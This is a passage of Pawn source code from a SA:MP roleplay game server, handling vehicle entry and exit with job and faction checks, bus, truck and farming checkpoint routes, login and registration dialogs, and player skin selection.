            GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
            SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
            EngineSTATE[newcar] = 1;
        }
        if(IsAGangCar8(newcar))
        {
         new vid = GetPlayerVehicleID(playerid);
         GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
         SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
         EngineSTATE[newcar] = 1;
        }
        new pveh = GetVehicleModel(GetPlayerVehicleID(playerid));
        if(pveh == 510 || pveh == 481 || pveh == 509)
        {
        new vid = GetPlayerVehicleID(playerid);
         GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
         SetVehicleParamsEx(vid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
         EngineSTATE[newcar] = 1;
         }
        if(IsAGangCar6(newcar))
        {
            if(PlayerInfo[playerid][pLeader] == 14||PlayerInfo[playerid][pMember] == 14) { }
            else KickAntiCheat(playerid,"Vehicle Cheats");
        }
		if(IsAGangCar7(newcar))
		{
			if(PlayerInfo[playerid][pLeader] == 15||PlayerInfo[playerid][pMember] == 15) { }
			else KickAntiCheat(playerid,"Vehicle Cheats");
		}
        if(IsAGangCar19(newcar))
        {
            if(PlayerInfo[playerid][pLeader] == 19||PlayerInfo[playerid][pMember] == 19) { }
            else KickAntiCheat(playerid,"Vehicle Cheats");
        }
        if(IsABus(newcar))
        {
            if(PlayerInfo[playerid][pJob] == 14)
            {
            }
            else {
            RemovePlayerFromVehicle(playerid);
            SendClientMessage(playerid, COLOR_LIGHTBLUE,"You are not a Bus Driver."); }
        }
        if(IsaTruckCar(newcar))
        {
             if(PlayerInfo[playerid][pJob] == 16)
             {
             if(OnCheckpoint[playerid] == 1) { SCM(playerid,COLOR_Good,"You already have an enable checkpoint."); }
             else
             {
             if(TruckAllowed[playerid] != 0) { SCM(playerid, COLOR_LIGHTBLUE, "Continue The Working ..."); }
             else
             {
             OnCheckpoint[playerid] = 1;
             SetPlayerCheckpoint(playerid,  -80.585586,-1130.416870,0.805137,4);
             SCM(playerid,COLOR_LIGHTBLUE,"First go to the checkpoint to start working.");
             CP[playerid] = 12345;
             }
             }
             }
             else {
             RemovePlayerFromVehicle(playerid);
            SendClientMessage(playerid, COLOR_LIGHTBLUE,"You are not a Trucker."); }
        }
        if(IsATowcar(newcar))
        {
            if(PlayerInfo[playerid][pJob] == 7) { }
            else KickAntiCheat(playerid,"Vehicle Cheats");
        }
		if(IsAProdsVeh(newcar))
		{
			format(string, sizeof(string), "Products: %d/%d", PlayerHaul[newcar][pLoad],PlayerHaul[newcar][pCapasity]);
			SendClientMessage(playerid, TEAM_DangerousTigers_COLOR, string);
			SendClientMessage(playerid, CRISTIAN, "____________________________________");
			SendClientMessage(playerid, COLOR_GRAD4, "INFO: You can deliver Products to Businesses.");
			SendClientMessage(playerid, COLOR_GRAD3, "INFO: Commands are /load /buyprods /sellprods");
        }
        if(newcar == SLVeh[0] || newcar == SLVeh[1] || newcar == SLVeh[2] || newcar == SLVeh[3] || newcar == SLVeh[4] || newcar == SLVeh[5])
        {
            if(TakingsiLesson[playerid] == 1) { }
            else
            {
                if(!IsAnInstructor(playerid)) KickAntiCheat(playerid,"Vehicle Cheats");
            }
        }
        if(newcar == 1 || newcar == 2 || newcar == 11)
        {
            if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pRank] >= 3) { }
            else
            {
                SendClientMessage(playerid,COLOR_BLUE,"You do not have rank 3 for flying Hunter.");
                RemovePlayerFromVehicle(playerid);
            }
        }
        if(newcar == 8 ||newcar == 9 || newcar == 10)
        {
            if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pRank] >= 3) { }
            else
            {
                SendClientMessage(playerid,COLOR_BLUE,"You do not have rank 3 for flying Hydra.");
                RemovePlayerFromVehicle(playerid);
            }
        }
		if(IsAnTaxiCar(newcar))
		{
			if(PlayerInfo[playerid][pLeader] == 10||PlayerInfo[playerid][pMember] == 10) { }
			else
			{
				SendClientMessage(playerid,COLOR_TAXI,"You are not a Taxi Driver.");
                RemovePlayerFromVehicle(playerid);
			}
		}
		if(newcar == ExamVeh[0] || newcar == ExamVeh[1] || newcar == ExamVeh[2] || newcar == ExamVeh[3] || newcar == ExamVeh[4] || newcar == ExamVeh[5] || newcar == ExamVeh[6])
		{
			if(TakingLesson[playerid] != 1)
			{
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"You haven't key for this vehicle.");
				RemovePlayerFromVehicle(playerid);
			}
			if(PlayerInfo[playerid][pLanguage] == 2) SendClientMessage(playerid,COLOR_LIGHTBLUE,"Instructor: OK, Now type /engne to starts of the engine your car");
			if(PlayerInfo[playerid][pLanguage] == 1) SCM(playerid,COLOR_LIGHTBLUE,"Moalem: Baraie Shoro Va Roshan Kardan Mashin Az /Engine Ya Dokme 2 Estefade Kon");
			OnCheckpoint[playerid] = 1;
			RCP[playerid] = 100;
			TextDrawShowForPlayer(playerid,TD_Exam[playerid][0]);
			TextDrawShowForPlayer(playerid,TD_Exam[playerid][1]);
			TextDrawShowForPlayer(playerid,TD_Exam[playerid][2]);
			TextDrawSetString(TD_Exam[playerid][0], "~w~Shoma Marhale ~g~0 ~w~Az ~g~30 ~w~Hastid");
			SetPlayerRaceCheckpoint(playerid,0,1686.2136,-2194.6980,13.3750,1799.5825,-2194.6406,13.3750,5.0);
        }
		if(IsANrcar(newcar))
        {
            if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9){ }
            else
            {
                SendClientMessage(playerid, COLOR_NEWS, "You are not a News Reporter member.");
                RemovePlayerFromVehicle(playerid);
            }
        }
        if(newcar == BusVeh[0] || newcar == BusVeh[1] || newcar == BusVeh[2] || newcar == BusVeh[3] || newcar == BusVeh[4] || newcar == BusVeh[5] || newcar == BusVeh[6] || newcar == BusVeh[7] || newcar == BusVeh[8])
        {
        if(PlayerInfo[playerid][pJob] == 14)
        {
        ManTooBusam[playerid] = 1;
        if(OnCheckpoint[playerid] == 1) { SCM(playerid,COLOR_Good,"You already have an enable checkpoint."); }
        else
        {
        if(BusLevel[playerid] == 0)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid, 1818.860473,-2093.046386,13.382812, 3.0);
        CP[playerid] = 1200;
        }
        if(BusLevel[playerid] == 1)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1938.380371,-2169.916259,13.382812, 3.0);
        CP[playerid] = 1201;
        }
        if(BusLevel[playerid] == 2)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2285.371826,-1662.898315,14.936391, 3.0);
        CP[playerid] = 1202;
        }
        if(BusLevel[playerid] == 3)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2450.424804,-1448.213989,23.828125, 3.0);
        CP[playerid] = 1203;
        }
        if(BusLevel[playerid] == 4)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2695.902832,-1661.408569,11.937602, 3.0);
        CP[playerid] = 1204;
        }
        if(BusLevel[playerid] == 5)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2463.549804,330.016906,31.871097, 3.0);
        CP[playerid] = 1205;
        }
        if(BusLevel[playerid] == 6)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2340.336181,113.618858,26.338420, 3.0);
        CP[playerid] = 1206;
        }
        if(BusLevel[playerid] == 7)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1321.443481,238.963165,19.406250, 3.0);
        CP[playerid] = 1207;
        }
        if(BusLevel[playerid] == 8)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,204.882202,-1375.271118,49.474456, 3.0);
        CP[playerid] = 1208;
        }
        if(BusLevel[playerid] == 9)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,927.803588,-965.041687,38.253925, 3.0);
        CP[playerid] = 1209;
        }
        if(BusLevel[playerid] == 10)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,793.322753,-1093.177124,23.955106, 3.0);
        CP[playerid] = 1210;
        }
        if(BusLevel[playerid] == 11)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1191.808837,-1356.988891,13.377698, 3.0);
        CP[playerid] = 1211;
        }
        if(BusLevel[playerid] == 12)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1525.891235,-1630.682006,13.382812, 3.0);
        CP[playerid] = 1212;
        }
        if(BusLevel[playerid] == 13)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1788.017333,-1735.934448,13.382812, 3.0);
        CP[playerid] = 1213;
        }
        if(BusLevel[playerid] == 14)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2236.548095,-1753.222290,13.390602, 3.0);
        CP[playerid] = 1214;
        }
        if(BusLevel[playerid] == 15)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2346.216064,-1476.802490,23.828125, 3.0);
        CP[playerid] = 1215;
        }
        if(BusLevel[playerid] == 16)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1798.175048,-2070.627929,13.570152, 3.0);
        CP[playerid] = 1216;
        }
        SCM(playerid,COLOR_LIGHTBLUE,"Drive this bus to the checkpoint to earn money");
        SCM(playerid,COLOR_LIGHTBLUE,"you can use /fare to set your fare and go on duty");
        }
        }
        }
        if(newcar == BusVeh[9] || newcar == BusVeh[10] || newcar == BusVeh[11] || newcar == BusVeh[12] || newcar == BusVeh[13] || newcar == BusVeh[14] || newcar == BusVeh[15])
        {
        if(PlayerInfo[playerid][pJob] == 14)
        {
        ManTooBusam[playerid] = 1;
        if(OnCheckpoint[playerid] == 1) { SCM(playerid,COLOR_Good,"You already have an enable checkpoint."); }
        else{
        if(BusLevelLV[playerid] == 0)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid, 1923.362792,2315.286132,10.671875, 3.0);
        CP[playerid] = 1217;
        }
        if(BusLevelLV[playerid] == 1)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1923.543457,2116.836914,10.728834, 3.0);
        CP[playerid] = 1218;
        }
        if(BusLevelLV[playerid] == 2)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2118.590576,1941.035766,10.671875, 3.0);
        CP[playerid] = 1219;
        }
        if(BusLevelLV[playerid] == 3)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1920.406616,1717.348022,10.671875, 3.0);
        CP[playerid] = 1220;
        }
        if(BusLevelLV[playerid] == 4)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1727.924926,1531.290161,10.664346, 3.0);
        CP[playerid] = 1221;
        }
        if(BusLevelLV[playerid] == 5)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1723.038818,1365.177490,10.499944, 3.0);
        CP[playerid] = 1222;
        }
        if(BusLevelLV[playerid] == 6)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1545.306762,1136.974609,10.671875, 3.0);
        CP[playerid] = 1223;
        }
        if(BusLevelLV[playerid] == 7)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1084.777221,1197.034790,10.671875, 3.0);
        CP[playerid] = 1224;
        }
        if(BusLevelLV[playerid] == 8)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1074.901123,2057.075439,10.671875, 3.0);
        CP[playerid] = 1225;
        }
        if(BusLevelLV[playerid] == 9)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,168.761199,1156.248413,14.423420, 3.0);
        CP[playerid] = 1226;
        }
        if(BusLevelLV[playerid] == 10)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1601.922119,1129.193847,10.671875, 3.0);
        CP[playerid] = 1227;
        }
        if(BusLevelLV[playerid] == 11)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2134.760009,1369.082031,10.671875, 3.0);
        CP[playerid] = 1228;
        }
        if(BusLevelLV[playerid] == 12)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,2556.691406,1308.975341,10.671875, 3.0);
        CP[playerid] = 1229;
        }
        if(BusLevelLV[playerid] == 13)
        {
        OnCheckpoint[playerid] = 1;
        SetPlayerCheckpoint(playerid,1893.817626,2286.743164,10.820312, 3.0);
        CP[playerid] = 1230;
        }
        SCM(playerid,COLOR_LIGHTBLUE,"Drive this bus to the checkpoint to earn money");
        SCM(playerid,COLOR_LIGHTBLUE,"you can use /fare to set your fare and go on duty");
        }
        }
        else{ RemovePlayerFromVehicle(playerid); SCM(playerid, COLOR_LIGHTBLUE, "You are not a bus driver.");}
        }
		if(IsAnRentCar(newcar))
        {
            if(MashinRenter[newcar] == INVALID_PLAYER_ID)
            {
                GameTextForPlayer(playerid, "~w~Bayad In Mashin Ra ejare Konid ~r~Ejare~n~~w~Type ~g~/rentveh ~w~Baraye Ejare", 5000, 3);
                OnRentMashinMessage[playerid] = true;
                TogglePlayerControllable(playerid, 0);
            }
            else
            {
                if(IsPlayerConnected(MashinRenter[newcar]))
                {
                    new fTT[128];
                    format(fTT, 128, "This vehicle is rented by %s.", PINFO[MashinRenter[newcar]][pName]);
                    SCM(playerid, COLOR_WHITE, fTT);
                }
                else SetVehicleToRespawn(newcar);
            }
        }
		if(IsAnHitmanCar(newcar))
		{
			if(PlayerInfo[playerid][pLeader] == 8||PlayerInfo[playerid][pMember] == 8) { }
			else KickAntiCheat(playerid,"Vehicle Cheats");
		}
        if(IsAHarvest2(newcar))
        {
        if(PlayerInfo[playerid][pJob] == 18)
            {
            ManTooCom[playerid] = 1;
            if(OnCheckpoint[playerid] == 1) { SCM(playerid,COLOR_Good,"You already have an enable checkpoint."); }
            else
            {
            SCM(playerid,COLOR_YELLOW,"Your farming is started,work to earn money.");
            randomsms[playerid] = RandomShomare(1,5);
            if(randomsms[playerid] == 1)
            {
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 35469;
            SetPlayerCheckpoint(playerid,-1110.039184,-1009.396606,128.780563,5);
            }
            if(randomsms[playerid] == 2)
            {
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 35471;
            SetPlayerCheckpoint(playerid,-1066.485229,-972.397888,129.218750,5);
            }
            if(randomsms[playerid] == 3)
            {
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 35473;
            SetPlayerCheckpoint(playerid,-1047.418945,-1028.907348,129.211929,5);
            }
            if(randomsms[playerid] == 4)
            {
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 35475;
            SetPlayerCheckpoint(playerid,-1117.415405,-1055.386230,129.218750,5);
            }
            if(randomsms[playerid] == 5)
            {
            OnCheckpoint[playerid] = 1;
            CP[playerid] = 35477;
            SetPlayerCheckpoint(playerid,-1013.720947,-921.570800,129.212646,5);
            }
            }
            }
            else { SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are not Farmer.");
                RemovePlayerFromVehicle(playerid);
            }
        }
        if(IsAHarvest(newcar))
        {
            if(PlayerInfo[playerid][pJob] == 18)
            {
            ManTooCom[playerid] = 1;
            if(OnCheckpoint[playerid] == 1) { SCM(playerid,COLOR_Good,"You already have an enable checkpoint."); }
            else{
            SCM(playerid,COLOR_YELLOW,"Your farming is started,work to earn money.");
            randomsm[playerid] = RandomShomare(1,7);
                if(randomsm[playerid] == 1)
                {
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-167.472991,-1409.605102,3.036767,5);
                CP[playerid] = 12389;
                }
                if(randomsm[playerid] == 2)
                {
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-313.921447,-1382.667480,11.314981,5);
                CP[playerid] = 12391;
                }
                if(randomsm[playerid] == 3)
                {
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-317.527496,-1327.227249,9.058633,5);
                CP[playerid] = 12393;
                }
                if(randomsm[playerid] == 4)
                {
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-303.710906,-1318.423828,9.106340,5);
                CP[playerid] = 12395;
                }
                if(randomsm[playerid] == 5)
                {
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-371.492431,-1323.586547,24.562522,5);
                CP[playerid] = 12397;
                }
                if(randomsm[playerid] == 6)
                {
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-402.660888,-1290.676513,31.735294,5);
                CP[playerid] = 12399;
                }
                if(randomsm[playerid] == 7)
                {
                OnCheckpoint[playerid] = 1;
                SetPlayerCheckpoint(playerid,-402.660888,-1290.676513,31.735294,5);
                CP[playerid] = 12401;
                }
            }
            }
            else
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are not Farmer.");
                RemovePlayerFromVehicle(playerid);
            }
        }
        gLastCar[playerid] = newcar;
        gLastDriver[newcar] = playerid;
    }
    else
    {
        if(OnRob[playerid] == true && RobLeader[playerid] == true)
        {
            SCM(playerid,COLOR_ALI,"You have been exited from your vehicle, and failed on your mission.");
            new strrali[256];format(strrali,256,"Mission ~r~Failed~n~~r~Leader(%s) has been exited from vehicle.",PINFO[playerid][pName]);
            for(new i;i<RobMemberCount[playerid];i++)
            {
                GameTextForPlayer(RobMember[playerid][i],strrali,9000,0);
                OnRob[RobMember[playerid][i]] = false;
                RobDriver[RobMember[playerid][i]] = INVALID_PLAYER_ID;
            }
            OnRob[playerid] = false;
            if(CP[playerid] >= 2002001 && CP[playerid] <= 2002009){DisablePlayerCheckpoint(playerid);OnCheckpoint[playerid] = 0;CP[playerid] = 0;}
            RobLeader[playerid] = false;
            RobMemberCount[playerid] = 0;
            for(new i;i<100;i++)
            {
                RobMember[playerid][i] = INVALID_PLAYER_ID;
            }
            RobDriver[playerid] = INVALID_PLAYER_ID;
        }
        if(TDShowedSpeedo[playerid] == true) {TextDrawHideForPlayer(playerid, SpeedoTextDraw[playerid]); TDShowedSpeedo[playerid] = false;}
        if(TDShowedFuel[playerid] == true) {TextDrawHideForPlayer(playerid, FuelTextDraw[playerid]); TDShowedFuel[playerid] = false;}
        TextDrawSetString(SpeedoTextDraw[playerid], "Speed: 0 Km/h");
        if(TDShowedKilo[playerid] == true) {TextDrawHideForPlayer(playerid, KiloTextDraw[playerid]); TDShowedKilo[playerid] = false;}
        if(TDShowedLock[playerid] == true) {TextDrawHideForPlayer(playerid, DoorsLockTextDraw[playerid]); TDShowedLock[playerid] = false;}
        if(TDShowedLock2[playerid] == true) {TextDrawHideForPlayer(playerid, DoorsLockTextDraw2[playerid]); TDShowedLock2[playerid] = false;}
        if(OnSpeedc[playerid] == 1)
        {
            SpeedTimerUsed[playerid] = false;
            KillTimer(SpeedTimer[playerid]);
            SpeedTimer[playerid] = 0;
            OnSpeedc[playerid] = 0;
            SCM(playerid,COLOR_ALI,"Speed Camera {FFFFFF}Disabled.");
        }
        if(OnAshghal[playerid] == 1)
        {
            SCM(playerid,COLOR_ROUZ,"You stopped your working.");
            CP[playerid] = 0;
            OnCheckpoint[playerid] = 0;
            DisablePlayerCheckpoint(playerid);
            OnAshghal[playerid] = 0;
        }
        if(CP[playerid] == 1 && PlayerInfo[playerid][pJob] == 5)
        {
            DisablePlayerCheckpoint(playerid);
            OnCheckpoint[playerid] = 0;
            SCM(playerid,COLOR_LIGHTBLUE,"You Exited from Vehicle and losted mission!");
            CP[playerid] = 0;
        }
        if(TakingLesson[playerid] == 1)
        {
            TakingLesson[playerid] = 0;
            DisablePlayerRaceCheckpoint(playerid);
            OnCheckpoint[playerid] = 0;
            if(PlayerInfo[playerid][pLanguage] == 2) SCM(playerid, COLOR_LIGHTBLUE, "Exam: You exited the Exam car and losted on exam test!");
            if(PlayerInfo[playerid][pLanguage] == 1) SCM(playerid,COLOR_LIGHTBLUE, "EXAM: To Az Mashin Piade Shodi Va Emtehan Ro Rad Shodi.");
            SetVehicleToRespawn(gLastCar[playerid]);
			TextDrawHideForPlayer(playerid,TD_Exam[playerid][0]);
			TextDrawHideForPlayer(playerid,TD_Exam[playerid][1]);
			TextDrawHideForPlayer(playerid,TD_Exam[playerid][2]);
            RCP[playerid] = 0;
        }
        if(ManTooBusam[playerid] == 1)
        {
            ManTooBusam[playerid] = 0;
            CP[playerid] = 0;
            SCM(playerid,COLOR_LIGHTRED,"You left bus,Checkpoint deleted, you can go into a bus to reload it.");
            DisablePlayerCheckpoint(playerid);
            OnCheckpoint[playerid] = 0;
        }
        if(ManTooCom[playerid] == 1)
        {
            ManTooCom[playerid] = 0;
            DisablePlayerCheckpoint(playerid);
            OnCheckpoint[playerid] = 0;
            randomsm[playerid] = 0;
            SCM(playerid,COLOR_LIGHTGREEN,"You stopped your farming.");
            CP[playerid] = 0;
        }
        new cp = CP[playerid];
        if(cp >= 2002001 && cp <= 2002009)
        {
            CP[playerid] = 0;
            DisablePlayerCheckpoint(playerid);
            OnCheckpoint[playerid] = 0;
            SCM(playerid,COLOR_RED, "You exited the Rob vehicle");
        }
    }
    if(newstate == PLAYER_STATE_SPAWNED)
    {
        new Float: lwx, Float:lwy, Float:lwz;
        GetPlayerPos(playerid, lwx, lwy, lwz);
        if((lwz > 530.0) || PlayerToPoint(1000.0, playerid, -1041.9,-1868.4,79.1)) //the highest land point in sa = 526.8
        {
            SetPlayerSpawn(playerid);
        }
        TelePos[playerid][0] = 0.0;
        TelePos[playerid][1] = 0.0;
        gPlayerSpawned[playerid] = 1;
    }
    return 1;
}

public CarTow(carid)
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(IsPlayerInVehicle(i, carid) || RentedVehicle[i] == carid)
            {
                return 0;
            }
        }
    }
    return 1;
}

public LockCar(carid)
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            SetVehicleParamsForPlayer(carid,i,0,1);
        }
    }
}

public UnLockCar(carid)
{
    for(new i = 0; i < LastPID; i++)
    {
        if(IsPlayerConnected(i))
        {
            if(!IsAPlane(carid))
            {
                SetVehicleParamsForPlayer(carid,i,0,0);
            }
        }
    }
}

Public:kicklog(playerid)
{
    if(gPlayerLogged[playerid] != 1)
    {
        KickWithMessage(playerid,COLOR_LIGHTRED,"Shoma Kick Shodid. Dalil: Vaght Shoma Baraie Vorod Be Server Be Payan Resid. 60 Sanie");
    }
    return 1;
}




public migamloginkon(playerid)
{
	SetPlayerPosEx(playerid,1469.3346, -2345.9790, 72.8283);
	SetPlayerFacingAngle(playerid, 0.0000);
	SetPlayerSkin(playerid, 304);
	new string[84];
	format(string, sizeof(string), "{57e547}%s (%i) {FFFFFF}Be Server Vared Shod. {57e547}(%s)", PINFO[playerid][pName], playerid, PINFO[playerid][pIp]);
	SendAdminMessage(0xBFC0C2FF, string);
	SetPlayerName(playerid, PlayerInfo[playerid][pName]);
    if(gPlayerLogged[playerid] != 1)
    {
        if(cache_get_row_count(handle))
        {
            cache_get_row(0,1,PlayerInfo[playerid][pKey],handle,128);
            cache_get_row(0,9,PlayerInfo[playerid][pLastLogin],handle,64);
            new loginstring[500];
            TogglePlayerSpectating(playerid, 1);
			SetPlayerCameraPos(playerid, 1020.8905, -1782.4042, 90.0785);
			SetPlayerCameraLookAt(playerid, 556.1578, -1441.9774, 80.5746);
		  //|----------ine cam----------|
			InterpolateCameraPos(playerid, 1375.969604, -1016.095947, 54.885509, 1418.011108, -845.501464, 95.831581, 5000);
			InterpolateCameraLookAt(playerid, 1374.632446, -1020.445434, 52.813232, 1418.347534, -840.777770, 97.435829, 5000);
            format(loginstring,sizeof(loginstring),"{BECBFC}Khosh Amadid, {57e547}%s{FFFFFF}!\n\nLotfan Password Khod Ra Jahate Login Vared Konid.{FFFFFF}* Akharin Login: {57e547}%s *",PINFO[playerid][pName],PlayerInfo[playerid][pLastLogin]);
            ShowPlayerDialog(playerid,12346,DIALOG_STYLE_PASSWORD,"Login",loginstring,"{00FF00}Login","{57e547}Quit");
            KickLogin[playerid] = SetTimerEx("kicklog", 60000, false, "i", playerid);
            KickLoginUsed[playerid] = true;
        }
        else
        {
             

			SetPlayerCameraPos(playerid, 1020.8905, -1782.4042, 90.0785);
			SetPlayerCameraLookAt(playerid, 556.1578, -1441.9774, 80.5746);
		  //|----------ine cam----------|
			InterpolateCameraPos(playerid, 1375.969604, -1016.095947, 54.885509, 1418.011108, -845.501464, 95.831581, 5000);
			InterpolateCameraLookAt(playerid, 1374.632446, -1020.445434, 52.813232, 1418.347534, -840.777770, 97.435829, 5000);
            new regstring[256];
            format(regstring,sizeof(regstring),"{BECBFC}Welcome to {57e547}JoKeR GaminG {FFFFFF} SA:MP Server, {95A3FF}%s{BECBFC}!Lotfan Jahate Sabte Nam Passwordi Baraie Khod Entekhab Konid Va Vared Konid.",PlayerName(playerid));
            ShowPlayerDialog(playerid,12345,DIALOG_STYLE_PASSWORD,"Account Registration",regstring,"Register","{57e547}Quit");
        }
        PlayerPlaySound(playerid, 1187, 0.0, 0.0, 0.0);
    }
}

public OnPlayerRequestClass(playerid, classid)
{
    if(gPlayerLogged[playerid] != 1 && RequestSelected[playerid] == false)
    {
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && i != playerid)
            {
                if(!strcmp(PINFO[playerid][pIp], PINFO[i][pIp], true))
                {
                    new strkesafat[256];
                    format(strkesafat, 256, "[IP-DETECT]: %s(%d) IP's Is Like %s(%d)", PINFO[playerid][pName],playerid, PINFO[i][pName],i);
                    AdminWarn(strkesafat);
                }
            }
        }
        RequestSelected[playerid] = true;
        new plname[MAX_PLAYER_NAME];
        GetPlayerName(playerid, plname, sizeof(plname));
        if(FindBadSign(plname))
        {
            ResetPlayerTofang(playerid);
//            TogglePlayerSpectating(playerid,1);
            SetSpawnKol(playerid);
            SpawnPlayer(playerid);
            for(new i = 0; i<100; i++) SCM(playerid,COLOR_WHITE, " ");
            new alistr[256];
            format(alistr, 256, "You used a Illegal name : %s, Use only A-Z, a-z, 0-9, (), [], _ for you name.",plname[playerid]);
            KickWithMessage(playerid, COLOR_LIGHTRED, alistr);
            TextDrawHideForPlayer(playerid,atxd[0]);
            TextDrawHideForPlayer(playerid,atxd[1]);
            TextDrawHideForPlayer(playerid,atxd[2]);
            TextDrawHideForPlayer(playerid,atxd[3]);
            TextDrawHideForPlayer(playerid,atxd[4]);
            TextDrawHideForPlayer(playerid,atxd[5]);
            TextDrawHideForPlayer(playerid,atxd[6]);
            TextDrawHideForPlayer(playerid,atxd[7]);
            TextDrawHideForPlayer(playerid,atxd[8]);
           // TextDrawHideForPlayer(playerid,AccountBar[3]);
//		    TextDrawHideForPlayer(playerid,TD_ConnectUp[0]);
            return 0;
        }
        if (gPlayerLogged[playerid] != 1 && ManMitoonamSkin[playerid] == 0)
        {
            ResetPlayerTofang(playerid);
            TogglePlayerSpectating(playerid,1);
            SetSpawnKol(playerid);
            SpawnPlayer(playerid);
            CheckIfPBanned(playerid);
            CheckIfBanned(playerid);
            if(PBANNED[playerid] != 1) SetTimerEx("CheckAccount",3000,0,"i",playerid);
        }
    }
    if(gPlayerLogged[playerid] == 1 && ManMitoonamSkin[playerid] != 0)
    {
    if(ManMitoonamSkin[playerid] == 1 && gPlayerLogged[playerid] >= 1)
    {
    if(IsInFaction(playerid) && PlayerFahmid[playerid] != 1)
    {
    SCM(playerid,COLOR_ALI,"This skin saved for Civil time, Type /clothes in a binco for change your skin at your faction/family.");
    PlayerFahmid[playerid] = 1;
    }
    switch(classid)
    {
    case 0:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
    SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 1);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 1;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 1:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 2);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 2;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 2:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
 SetPlayerCameraPos(playerid, 1181.9352, -1171.7822, 93.9659);
    SetPlayerCameraLookAt(playerid, 1181.6385, -1172.7347, 93.6807);
    SetPlayerSkin(playerid, 3);
    LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
    PlayerInfo[playerid][cSkin] = 3;
    SetPlayerFacingAngle( playerid, 0 );
    SetPlayerVirtualWorld(playerid, 2);
    }
    case 3:
    {
    SetPlayerPosEx(playerid, 1180.3374, -1181.2975, 90.8448);
